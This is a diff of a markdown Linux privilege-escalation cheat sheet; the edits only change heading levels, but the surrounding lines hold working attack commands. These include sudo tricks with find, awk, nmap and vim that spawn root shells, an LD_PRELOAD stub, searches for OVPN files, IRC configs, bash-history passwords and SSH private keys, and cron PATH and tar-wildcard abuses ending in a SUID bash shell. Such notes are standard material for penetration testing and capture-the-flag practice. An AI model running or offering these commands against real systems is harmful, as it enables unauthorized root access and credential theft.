@@ -104,31 +104,31 @@ modinfo libata
 
 Reference https://gtfobins.github.io/
 
-#### Nano
+### Nano
 
 ```
 sudo find /bin -name nano -exec /bin/sh \;
 ```
 
-#### Awk
+### Awk
 
 ```
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
-#### Nmap
+### Nmap
 
 ```
 echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
 ```
 
-#### Vim
+### Vim
 
 ```
 sudo vim -c '!sh'
 ```
 
-#### LD\_PRELOAD
+### LD\_PRELOAD
 
 create file as malicious.c
 
@@ -238,13 +238,13 @@ su thescriptkid
 
 ## Stored Passwords & Keys
 
-#### OVPN Files
+### OVPN Files
 
 ```
 find / -iname "*.ovpn" 2> /dev/null
 ```
 
-#### Irssi Files
+### Irssi Files
 
 ```
 find / -iname "config" 2> /dev/null | grep -i "irssi"
@@ -254,13 +254,13 @@ find / -iname "config" 2> /dev/null | grep -i "irssi"
 cat filename | grep -i passw
 ```
 
-#### Bash History
+### Bash History
 
 ```
 cat /home/*/.bash_history | grep -i passw
 ```
 
-#### SSH Keys
+### SSH Keys
 
 ```
 find / -name id_rsa 2> /dev/null
@@ -372,7 +372,7 @@ ls /etc/cron.d
 cat /var/spool/cron/crontabs/root
 ```
 
-#### Path
+### Path
 
 _This abuses misconfigured path in "/etc/crontab". If a user has write permissions in the directory that is in the path. create a file with the same name as the cronjob with malicious contents._
 
@@ -388,13 +388,13 @@ chmod +x /wrietable/directory/somefile
 /tmp/bash -p
 ```
 
-#### Wildcards
+### Wildcards
 
 ```
 cat /etc/crontab
 ```
 
-#### **Tar**
+### **Tar**
 
 _Exploitable if cronjob script that is using tar and has a wildcard \* Example: tar czf /tmp/backup.tar.gz_
 
@@ -413,7 +413,7 @@ _Wait for execution_
 /tmp/bash -p
 ```
 
-#### File Overwrite
+### File Overwrite
 
 ```
 cat /etc/crontab
